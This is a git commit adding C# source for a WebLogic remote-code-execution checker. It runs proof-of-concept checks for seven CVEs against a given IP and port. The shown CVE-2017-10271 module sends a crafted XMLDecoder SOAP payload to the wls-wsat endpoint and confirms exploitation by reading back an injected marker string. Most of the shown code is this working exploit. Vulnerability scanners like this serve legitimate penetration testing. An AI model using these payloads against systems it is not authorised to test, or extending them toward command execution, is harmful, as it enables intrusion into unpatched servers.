3fbb48157eb552cfa2424ce838209f44b1ed0bf7
RcoIl <rcoil.me@gmail.com>
2019-06-02 17:13:26 +0800

    WeblogicRCE check version

---
+++ WeblogicRCE/WeblogicRCE/Program.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Text;
+using System.Text.RegularExpressions;
+using WeblogicRCE.WeblogicPOC;
+
+namespace WeblogicRCE
+{
+    class Program
+    {
+        private static void Usage()
+        {
+            string usage = "";
+            usage += "[+] Usage:\r\n";
+            usage += "[+] WeblogicRCE.exe -check <ip:port>\r\n";
+            Console.WriteLine(usage);
+        }
+
+        private static void Check(string ip, int port)
+        {
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2016-0638");
+            CVE_2016_0638_POC.Check(ip, port);
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2016-3510");
+            CVE_2016_3510_POC.Check(ip, port);
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2017-3248");
+            CVE_2017_3248_POC.Check(ip, port);
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2017-10271");
+            CVE_2017_10271_POC.Check(ip, port);
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2018-2628");
+            CVE_2018_2628_POC.Check(ip, port);
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2018-2893");
+            CVE_2018_2893_POC.Check(ip, port);
+            Console.WriteLine();
+            Console.WriteLine("[+] Start Check CVE-2019-2725");
+            CVE_2019_2725_POC.Check(ip, port);
+        }
+
+        static void Main(string[] args)
+        {
+            String Banner = Properties.Resources.banner;
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine(Banner);
+
+            if (args.Length != 3)
+            {
+                Usage();
+                Environment.Exit(0);
+            }
+            else if (args.Length == 3)
+            {
+                if (args[0] == "-check")
+                {
+                    Console.WriteLine("\n[+] Welcome To WeblogicRCE Check !!!\n");
+                    string ip = args[1];
+                    int port = Convert.ToInt32(args[2]);
+                    Check(ip, port);
+                }
+                else
+                {
+                    Environment.Exit(0);
+                }
+            }
+
+        }
+    }
+}
---
+++ WeblogicRCE/WeblogicRCE/WeblogicPOC/CVE_2017_10271_POC.cs
@@ -0,0 +1,70 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Net;
+using System.IO;
+
+namespace WeblogicRCE.WeblogicPOC
+{
+    class CVE_2017_10271_POC
+    {
+        public static void Check(string ip, int port)
+        {
+            string payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><void class=\"java.lang.Thread\" method=\"currentThread\"><void method=\"getCurrentWork\"><void method=\"getResponse\"><void method=\"getServletOutputStream\"><void method=\"writeStream\"><object idref=\"proc\"></object></void><void method=\"flush\"/></void>";
+            payload += "<void method=\"getWriter\"><void method=\"write\"><string>WeblogicRCE Demo</string></void></void>";
+            payload += "</void></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
+
+            string url = "http://" + ip +":"+ port+ "/wls-wsat/CoordinatorPortType";
+            Requests_CVE_2017_10271_POC(url, payload);
+        }
+
+        private static void Requests_CVE_2017_10271_POC(string url, string data)
+        {
+            WebRequest WebRequest = (WebRequest)WebRequest.Create(url);
+            WebRequest.Method = "POST"; 
+            WebRequest.ContentType = "text/xml";
+            WebRequest.Proxy = null;
+
+            byte[] bytes = Encoding.ASCII.GetBytes(data);
+            WebRequest.ContentLength = (long)bytes.Length;
+            try
+            {
+                Stream requestStream = WebRequest.GetRequestStream();
+                requestStream.Write(bytes, 0, bytes.Length);
+                Console.WriteLine("  [>] Sending Payload");
+                requestStream.Close();
+                try
+                {
+                    HttpWebResponse httpWebResponse = (HttpWebResponse)WebRequest.GetResponse();
+                    Stream myResponseStream = httpWebResponse.GetResponseStream();
+                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.UTF8);
+                    string recStr = myStreamReader.ReadToEnd();
+                    if (recStr.Contains("WeblogicRCE Demo"))
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("  [>] Is Vulnerability CVE-2017-10271 ");
+                        Console.ForegroundColor = ConsoleColor.White;
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("  [!] Not Vulnerability CVE-2017-10271 ");
+                        Console.ForegroundColor = ConsoleColor.White;
+                    }
+                    myStreamReader.Close();
+                    myResponseStream.Close();
+                }
+                catch (WebException ex)
+                {
+                    Console.WriteLine("[-] 请检查当前网络与目标 Weblogic 连接状态" + ex);
+                }
+            }
+            catch (WebException ex)
+            {
+                Console.WriteLine("[-] 请检查当前网络与目标 Weblogic 连接情况" + ex);
+            }
+        }
+
+    }
+}
